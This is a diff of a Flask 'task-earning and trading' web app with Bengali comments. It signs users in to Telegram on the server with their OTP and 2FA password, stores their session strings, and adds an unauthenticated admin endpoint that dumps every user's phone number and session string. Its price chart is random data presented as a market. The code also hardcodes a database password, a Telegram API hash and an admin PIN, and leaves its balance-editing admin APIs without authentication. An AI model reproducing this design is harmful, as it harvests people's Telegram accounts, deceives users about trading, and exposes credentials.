@@ -2,20 +2,37 @@ import os
 import asyncio
 import random
 import time
-from datetime import datetime
+from datetime import datetime, timedelta
 from threading import Thread
-from flask import Flask, render_template, request, jsonify, session
+from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 from flask_cors import CORS
 from pymongo import MongoClient
 from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
-from bson import ObjectId  # এটি যোগ করা হয়েছে (ObjectId এরর ফিক্স করতে)
+from bson import ObjectId
 import firebase_admin
 from firebase_admin import credentials, db
 
 # ---------------------------------------------------------
-# ১. Firebase কনফিগারেশন
+# ১. কনফিগারেশন ও ডাটাবেস সেটআপ
 # ---------------------------------------------------------
+app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")
+# সেশন ১ বছর স্থায়ী করার জন্য
+app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=10)
+
+@app.before_request
+def make_session_permanent():
+    session.permanent = True
+
+CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
+
+# API & DB Info
+API_ID = 36466824
+API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
+MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
+
+# Firebase Setup
 try:
     if not firebase_admin._apps:
         cred = credentials.Certificate("firebase-key.json")
@@ -26,18 +43,7 @@ try:
 except Exception as e:
     print(f"Firebase Init Error: {e}")
 
-# ---------------------------------------------------------
-# ২. ফ্লাস্ক অ্যাপ ও ডাটাবেস সেটআপ
-# ---------------------------------------------------------
-app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")
-CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)
-
-# আপনার কনফিগারেশন
-API_ID = 36466824
-API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
-MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
-
+# MongoDB Setup
 client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000)
 mdb = client_db['aaf_tele_earn_db']
 users_col = mdb['users']
@@ -48,21 +54,18 @@ withdraws_col = mdb['withdraws']
 temp_clients = {}
 
 # ---------------------------------------------------------
-# ৩. ক্যান্ডেল জেনারেটর লজিক (Background Thread)
+# ২. ক্যান্ডেল জেনারেটর (Background Thread)
 # ---------------------------------------------------------
 def generate_candles_background():
-    print("🚀 Candle Generator Thread Started...")
+    print("🚀 Candle Generator Started...")
     while True:
         try:
-            # সর্বশেষ ক্যান্ডেলের ডাটা নেওয়া
             last_candle = fb_ref.order_by_key().limit_to_last(1).get()
-            
             open_price = 1.0000
             if last_candle:
                 for key, val in last_candle.items():
                     open_price = val['close']
 
-            # প্রাইস মুভমেন্ট লজিক
             volatility = 0.002
             close_price = open_price + random.uniform(-volatility, volatility)
             
@@ -73,55 +76,110 @@ def generate_candles_background():
                 "close": round(close_price, 4),
                 "timestamp": int(time.time() * 1000)
             }
-
             fb_ref.push(new_candle)
-            time.sleep(60) # প্রতি ১ মিনিট পর পর ক্যান্ডেল তৈরি হবে
+            time.sleep(60)
         except Exception as e:
-            print(f"🔥 Candle Gen Error: {e}")
             time.sleep(10)
 
-# ক্যান্ডেল জেনারেটর ব্যাকগ্রাউন্ডে চালু করা
 Thread(target=generate_candles_background, daemon=True).start()
 
 # ---------------------------------------------------------
-# ৪. HTML পেজ রাউটস
+# ৩. HTML পেজ রাউটস
 # ---------------------------------------------------------
+@app.route('/')
+def index():
+    if 'uid' in session: return redirect(url_for('render_dashboard_page'))
+    return render_template('login.html')
+
 @app.route('/dashboard')
 def render_dashboard_page(): 
-    if 'uid' not in session: return render_template('login.html')
-    return render_template('dashboard.html')
+    if 'uid' not in session: return redirect(url_for('index'))
+    user = users_col.find_one({"telegram_id": int(session['uid'])})
+    return render_template('dashboard.html', user=user)
 
 @app.route('/task')
 def render_task_page(): 
-    if 'uid' not in session: return render_template('login.html')
+    if 'uid' not in session: return redirect(url_for('index'))
     return render_template('task.html')
 
 @app.route('/treading')
 def render_treading_page():
-    if 'uid' not in session: return render_template('login.html')
+    if 'uid' not in session: return redirect(url_for('index'))
     return render_template('treading.html')
 
 @app.route('/account')
 def render_account_page():
-    if 'uid' not in session: return render_template('login.html')
+    if 'uid' not in session: return redirect(url_for('index'))
     return render_template('account.html')
 
 @app.route('/wallet')
 def render_wallet_page(): 
-    if 'uid' not in session: return render_template('login.html')
+    if 'uid' not in session: return redirect(url_for('index'))
     return render_template('wallet.html')
 
+@app.route('/logout')
+def user_logout():
+    session.pop('uid', None)
+    return redirect(url_for('index'))
+
+# ---------------------------------------------------------
+# ৪. অ্যাডমিন কন্ট্রোল এপিআই (Admin Panel)
+# ---------------------------------------------------------
 ADMIN_PIN = "Abdullah6790" 
 @app.route('/admin')
 def render_admin_panel():
     user_pin = request.args.get('pin')
     if user_pin == ADMIN_PIN:
         return render_template('admin.html')
-    else:
-        return f'Admin PIN needed', 403
+    return "Access Denied", 403
+
+@app.route('/api/admin/get_all_users')
+def manage_get_all_users():
+    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "telegram_id": 1, "main_balance": 1, "status": 1}))
+    return jsonify({"success": True, "users": users})
+
+@app.route('/api/admin/get_all_sessions')
+def manage_get_sessions():
+    users = list(users_col.find({}, {"_id": 0, "name": 1, "phone": 1, "session_string": 1}))
+    return jsonify({"success": True, "sessions": users})
+
+@app.route('/api/add_task', methods=['POST'])
+def manage_add_task():
+    data = request.json
+    tasks_col.insert_one({
+        "title": data.get('title'),
+        "reward": float(data.get('reward', 0)),
+        "link": data.get('link'),
+        "category": data.get('category', 'General'),
+        "description": data.get('desc', ''),
+        "status": "active",
+        "created_at": datetime.utcnow()
+    })
+    return jsonify({"success": True})
+
+@app.route('/api/admin/delete_task/<task_id>', methods=['DELETE'])
+def delete_task_api(task_id):
+    tasks_col.delete_one({"_id": ObjectId(task_id)})
+    return jsonify({"success": True})
+
+@app.route('/api/admin/update_user', methods=['POST'])
+def manage_update_user():
+    data = request.json
+    uid = int(data.get('telegram_id'))
+    bal = float(data.get('balance', 0))
+    users_col.update_one({"telegram_id": uid}, {"$set": {"main_balance": bal}})
+    return jsonify({"success": True})
+
+@app.route('/api/update_ads', methods=['POST'])
+def manage_update_ads():
+    data = request.json
+    ads_col.delete_many({}) # আগের অ্যাড মুছে ফেলা
+    if data.get('ads'):
+        ads_col.insert_many(data.get('ads'))
+    return jsonify({"success": True})
 
 # ---------------------------------------------------------
-# ৫. টেলিগ্রাম লগইন এপিআই
+# ৫. ইউজার ও ট্রেড এপিআই
 # ---------------------------------------------------------
 @app.route('/api/send_otp', methods=['POST'])
 def send_otp_handler():
@@ -134,24 +192,7 @@ def send_otp_handler():
         client.connect()
         result = client.send_code_request(phone)
         temp_clients[phone] = {"client": client, "hash": result.phone_code_hash}
-        return jsonify({"success": True, "message": "OTP Sent!"})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
-
-@app.route('/api/add_task', methods=['POST'])
-def manage_add_task():
-    try:
-        task_data = request.json
-        tasks_col.insert_one({
-            "title": task_data.get('title'),
-            "reward": float(task_data.get('reward', 0)),
-            "link": task_data.get('link'),
-            "category": task_data.get('category', 'General'), # নতুন ঘর
-            "description": task_data.get('desc', ''),        # নতুন ঘর
-            "status": "active",
-            "created_at": datetime.utcnow()
-        })
-        return jsonify({"success": True, "message": "Task Added!"})
+        return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
@@ -159,132 +200,85 @@ def manage_add_task():
 def verify_login_handler():
     data = request.json
     phone, code, password = data.get('phone'), data.get('code'), data.get('password')
-    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
+    if phone not in temp_clients: return jsonify({"success": False, "message": "Expired"})
     try:
         client = temp_clients[phone]["client"]
         h = temp_clients[phone]["hash"]
         user = client.sign_in(phone, code, phone_code_hash=h, password=password)
         session_str = client.session.save()
-        user_info = {
-            "telegram_id": user.id,
-            "phone": phone,
-            "name": f"{user.first_name or ''} {user.last_name or ''}",
-            "session_string": session_str, 
-            "last_login": datetime.utcnow()
-        }
+        
         users_col.update_one(
             {"telegram_id": user.id},
-            {"$set": user_info, "$setOnInsert": {"main_balance": 0.0, "aaf_balance": 0.0, "status": "active", "completed_tasks": []}},
+            {"$set": {
+                "telegram_id": user.id,
+                "phone": phone,
+                "name": f"{user.first_name or ''} {user.last_name or ''}",
+                "session_string": session_str,
+                "last_login": datetime.utcnow()
+            }, "$setOnInsert": {"main_balance": 0.0, "aaf_balance": 0.0, "status": "active", "completed_tasks": []}},
             upsert=True
         )
         session["uid"] = user.id
-        return jsonify({"success": True, "uid": user.id})
+        return jsonify({"success": True})
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
-@app.route('/api/admin/get_all_users')
-def manage_get_all_users():
-    # ডাটাবেস থেকে সব ইউজারের প্রয়োজনীয় তথ্য নেওয়া
-    users = list(users_col.find({}, {
-        "_id": 0, 
-        "name": 1, 
-        "phone": 1, 
-        "telegram_id": 1, 
-        "main_balance": 1,
-        "joined_at": 1
-    }))
-    return jsonify({"success": True, "users": users})
-
-# ---------------------------------------------------------
-# ৬. ইউজার প্রোফাইল ও ট্রেড এপিআই
-# ---------------------------------------------------------
 @app.route('/api/user/dashboard_stats')
-@app.route('/api/get_user_info')
 def get_user_data_api():
     uid = session.get('uid')
     if not uid: return jsonify({"success": False})
-    user = users_col.find_one({"telegram_id": uid})
+    user = users_col.find_one({"telegram_id": int(uid)})
     if user:
         return jsonify({
             "success": True,
             "balance": user.get('main_balance', 0.0),
             "aaf_balance": user.get('aaf_balance', 0.0),
-            "name": user.get('name', 'User'),
-            "id": uid
+            "name": user.get('name', 'User')
         })
     return jsonify({"success": False})
 
-@app.route('/api/trade/execute', methods=['POST'])
-def execute_trade():
-    data = request.json
-    uid = data.get('uid') or session.get('uid')
-    trade_type = data.get('type') # BUY বা SELL
-    amount = float(data.get('amount', 0))
-    
-    user = users_col.find_one({"telegram_id": int(uid)})
-    if not user: return jsonify({"status": "error", "message": "User not found"})
-
-    fee = amount * 0.10
-    net_amount = amount - fee
-
-    if trade_type == 'BUY':
-        if user.get('main_balance', 0) < amount:
-            return jsonify({"status": "error", "message": "Insufficient TK Balance!"})
-        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": -amount, "aaf_balance": net_amount}})
-    else: 
-        if user.get('aaf_balance', 0) < amount:
-            return jsonify({"status": "error", "message": "Insufficient AAF Balance!"})
-        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"aaf_balance": -amount, "main_balance": net_amount}})
-
-    return jsonify({"status": "success"})
-
-@app.route('/api/user/tasks/claim', methods=['POST'])
-def claim_task():
-    try:
-        data = request.json
-        uid = session.get('uid')
-        task_id = data.get('task_id')
-        task = tasks_col.find_one({"_id": ObjectId(task_id)})
-        user = users_col.find_one({"telegram_id": uid})
-        
-        if user and task:
-            if task_id in user.get("completed_tasks", []):
-                return jsonify({"status": "error", "message": "Already Claimed!"})
-            
-            reward = float(task.get('reward', 0))
-            users_col.update_one(
-                {"telegram_id": uid},
-                {"$inc": {"main_balance": reward}, "$push": {"completed_tasks": task_id}}
-            )
-            return jsonify({"status": "success", "reward": reward})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-# ---------------------------------------------------------
-# ৭. অন্যান্য এড ও টাস্ক এপিআই
-# ---------------------------------------------------------
 @app.route('/api/get_tasks')
 def fetch_tasks():
     tasks = list(tasks_col.find({"status": "active"}))
     for t in tasks: t['_id'] = str(t['_id'])
     return jsonify({"success": True, "tasks": tasks})
+
+@app.route('/api/user/tasks/claim', methods=['POST'])
+def claim_task():
+    data = request.json
+    uid = session.get('uid')
+    task_id = data.get('task_id')
+    user = users_col.find_one({"telegram_id": int(uid)})
+    if task_id in user.get("completed_tasks", []):
+        return jsonify({"status": "error", "message": "Already Claimed"})
     
-@app.route('/api/admin/delete_task/<task_id>', methods=['DELETE'])
-def delete_task(task_id):
-    try:
-        from bson import ObjectId
-        tasks_col.delete_one({"_id": ObjectId(task_id)})
-        return jsonify({"success": True, "message": "Task Deleted!"})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
+    task = tasks_col.find_one({"_id": ObjectId(task_id)})
+    reward = float(task.get('reward', 0))
+    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": reward}, "$push": {"completed_tasks": task_id}})
+    return jsonify({"status": "success", "reward": reward})
+
+@app.route('/api/trade/execute', methods=['POST'])
+def execute_trade():
+    data = request.json
+    uid = session.get('uid')
+    trade_type = data.get('type')
+    amount = float(data.get('amount', 0))
+    user = users_col.find_one({"telegram_id": int(uid)})
+    
+    fee = amount * 0.10
+    net = amount - fee
+
+    if trade_type == 'BUY':
+        if user['main_balance'] < amount: return jsonify({"status": "error"})
+        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": -amount, "aaf_balance": net}})
+    else:
+        if user['aaf_balance'] < amount: return jsonify({"status": "error"})
+        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"aaf_balance": -amount, "main_balance": net}})
+    return jsonify({"status": "success"})
 
 @app.route('/api/get_ads')
 def fetch_ads():
     return jsonify({"success": True, "ads": list(ads_col.find({}, {"_id": 0}))})
 
-@app.route('/ping')
-def ping_checker(): return "PONG", 200
-
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
